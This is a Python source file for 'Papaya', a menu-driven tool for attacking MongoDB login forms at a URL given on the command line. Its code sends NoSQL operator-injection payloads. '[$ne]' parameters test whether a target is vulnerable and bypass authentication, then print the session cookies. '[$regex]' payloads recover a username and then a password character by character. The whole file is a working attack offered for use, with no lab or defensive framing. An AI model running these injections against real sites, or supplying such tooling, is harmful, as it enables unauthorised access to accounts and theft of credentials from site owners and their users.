#!/usr/bin/env python3

from requests_html import HTMLSession
import requests, sys
import os
try:
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup

username = "admin"
user_param = "username"
password_param ="password"
success_string = "Welcome back"

def print_options():
    clear_terminal()
    print(
f"""\033[94m[1]\033[0m Set target username (Current: '{username}')
\033[94m[2]\033[0m Set username POST parameter (Current: '{user_param}')
\033[94m[3]\033[0m Set password POST parameter (Current: '{password_param}')
\033[94m[4]\033[0m Set unique success-identifier (Current: '{success_string}')
-------------------------------
\033[92m[5]\033[0m Test for vulnerability  .'|'.
\033[92m[6]\033[0m Brute force username   /.'|\\ \\
\033[92m[7]\033[0m Brute force password   | /|'.|
\033[92m[8]\033[0m Bypass login            \ |\/
---------------------        \|/
\033[94m[0]\033[0m Exit Papaya
?""")

def main():
    global success_string, user_param, password_param, page, username
    print_options()
    try:
        choice = input()

        if choice == "1":
            log("Enter username", 3)
            username = input()
        elif choice == "2":
            log("Set username POST parameter", 3)
            user_param = input()
        elif choice == "3":
            log("Set password POST parameter", 3)
            password_param = input()
        elif choice == "4":
            log("Set unique string in positive html response", 3)
            success_string = input()
        elif choice == "5":
            choice_test_vulnerability()
        elif choice == "6":
            choice_username()
        elif choice == "7":
            choice_password()
        elif choice == "8":
            choice_authenticate()
        elif choice == "0":
            log("Exiting...", 3)
            quit()
            return

        main()
    except KeyboardInterrupt:
        return

def choice_test_vulnerability():
    clear_terminal()
    log("Testing for vulnerability")
    log(f"Target: '{url}'", 3)
    test_vulnerability()
    await_input()

def choice_username():
    global username
    clear_terminal()
    log("Getting username...")
    log(f"Target: '{url}'", 3)
    username = get_username()
    if not username:
        username = 'admin'
    await_input()

def choice_password():
    clear_terminal()
    if username == 'admin':
        log("Default user 'admin' used. Maybe get a username first", 3)
    log(f"Testing password length for user: '{username}'")
    log(f"Target: '{url}'", 3)
    pw_length = get_password_length(username)
    if pw_length:
        log(f"Getting password for '{username}' with length {pw_length} ")
        get_password(username, pw_length)
    await_input()

def choice_authenticate():
    clear_terminal()
    log("Bypassing login")
    log(f"Target: '{url}'", 3)
    authenticate()
    await_input()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""------------------------------
\033[1mPapaya\033[0m                       /\\
MongoDB Login Bruteforce    (  )
---------------------------  `´""")

def await_input():
    log("Press Enter to get back to main menu", 3)
    input()

def log(string, type=1):
    if type == 1: # positive
        print(f'\033[92m[+]\033[0m {string}')
    elif type == 2: # warning
        print(f'\033[93m[-]\033[0m {string}')
    elif type == 3: # indication
        print(f'\033[94m[!]\033[0m {string}')

def not_vulnerable(coming_from_check=False):
    log("Not vulnerable. Check parameters", 2)
    if not coming_from_check:
        log("Did you forget to set the success-identifier?", 2)

def send_sessionless_post(params):
    try:
        return requests.post(url, data=params)
    except KeyboardInterrupt:
        await_input()
        main()
    except:
        log("Could not connect to target", 2)
        await_input()
        main()

def is_successfull(success_string, response):
    if success_string in str(response.content):
        return True
    return False

def test_vulnerability():
    try:
        session = HTMLSession()

        response_bogus = session.post(url, {
            user_param :'xXbOgUsXx',
            password_param :'xXbOgUsXx'
        })

        response_injection = session.post(url, {
            user_param + "[$ne]":'xXbOgUsXx',
            password_param + "[$ne]":'xXbOgUsXx'
        })

        response_bogus = BeautifulSoup(response_bogus.text, 'lxml')
        response_injection = BeautifulSoup(response_injection.text, 'lxml')

        if response_bogus.body == response_injection.body:
            not_vulnerable(True)
        else:
            log(f"Got possible successful login response:\n{response_injection.body}\n", 3)
            log(f"Got possible failed login response:\n{response_bogus.body}\n", 3)
            log("Responses differ.")
            log("Application appears to be vulnerable!")

            if len(session.cookies.get_dict()):
                log("Response returned cookies. Maybe we found a session cookie?")
                print(session.cookies.get_dict())

            log("Inspect the above responses to find a unique string to identify a successful login and adjust the options accordingly", 3)
    except KeyboardInterrupt:
        await_input()
        main()
    except:
        log("Could not connect to target", 2)
        await_input()
        main()

def authenticate():
    params = {
        user_param + "[$ne]":'xXbOgUsXx',
        password_param + "[$ne]":'xXbOgUsXx'
    }

    try:
        session = HTMLSession()

        try:
            response = session.post(url, data=params)
        except KeyboardInterrupt:
            return

        if is_successfull(success_string, response):
            log("Authenticated!")
            log("Session cookies:")
            print(session.cookies.get_dict())
            return
        else:
            not_vulnerable()
    except KeyboardInterrupt:
        await_input()
        main()
    except:
        log("Could not connect to target", 2)
        await_input()
        main()

def get_username():
    username = ""
    alphabet = list(map(chr, range(97, 122)))

    while True:
        for c in alphabet:
            params = {
                user_param + "[$regex]":"^"+username+c+".*",
                password_param + "[$ne]":'xXbOgUsXx'
            }

            response = send_sessionless_post(params)

            if not response:
                not_vulnerable()
                return
            if is_successfull(success_string, response):
                username = username + c
                log(f"Next character found! User='{username}'")
                break

            if c == alphabet[-1]:
                if len(username):
                    log(f"User found: '{username}'")
                    return username
                else:
                    not_vulnerable()
                    return

def get_password(username, pw_length):
    password = ""
    alphabet = list(map(chr, range(33, 176)))
    regex_chars = ['.', '^', '*', '+', '-', '?', '$', '\\', '|']
    count = pw_length-1

    while True:
        if count == -1:
            return password
        for c in alphabet:

            if c in regex_chars:
                continue

            params = {
                user_param:username,
                password_param+"[$regex]":password+c+".{"+str(count)+"}"
            }

            response = send_sessionless_post(params)

            if is_successfull(success_string, response):
                if count == 0:
                    log(f"Password found: {password}")
                    return password
                password = password + c
                log(f"Next character found! Password='{password}'...")
                log(f"{count} Characters left...", 3)
                count -= 1
                break

def get_password_length(username):
    pw_length = 50
    while True:
        params = {
            'username':username,
            'password[$regex]':".{"+str(pw_length)+"}"
        }

        response = send_sessionless_post(params)

        if is_successfull(success_string, response):
            log(f"Found password length: {pw_length}")
            return pw_length

        if pw_length == 0:
            not_vulnerable()
            return

        pw_length -= 1

if __name__ == "__main__":
    global url

    if len(sys.argv) < 2:
        print("\nTarget URL not supplied.\nUsage: python3 papaya.py http[s]://TARGET")
        quit()
    elif (sys.argv[1][0:7] != "http://") and (sys.argv[1][0:8] != "https://"):
        print("\nTarget URL in wrong format.\nUsage: python3 papaya.py http[s]://TARGET")
        quit()
    else:
        url = sys.argv[1]
        main()
